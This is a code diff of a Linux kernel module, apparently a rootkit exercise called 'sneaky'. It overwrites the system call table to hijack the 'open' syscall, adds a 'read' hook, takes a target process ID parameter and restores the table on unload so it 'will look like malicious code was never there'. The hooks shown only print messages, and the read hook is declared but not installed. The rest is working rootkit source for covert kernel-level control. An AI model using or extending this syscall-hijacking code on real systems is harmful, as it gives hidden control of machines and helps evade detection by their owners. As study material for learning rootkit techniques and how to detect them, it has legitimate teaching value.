@@ -47,14 +47,31 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_call_open)(const char *pathname, int flags);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  printk(KERN_INFO "Open: Very, very Sneaky!\n");
+  return original_call_open(pathname, flags);
 }
+
+////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
+
+asmlinkage int (*original_call_read)(int fd, void *buf, size_t count);
+
+//Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
+{
+  printk(KERN_INFO "Read: Very, very Sneaky!\n");
+  return original_call_read(fd,buf,count);
+}
+
+////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
 
 static int sneaky_process_pid=-1;
 module_param(sneaky_process_pid, int, 0);
@@ -82,7 +99,7 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
+  original_call_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   //Revert page to read-only
@@ -111,7 +128,7 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
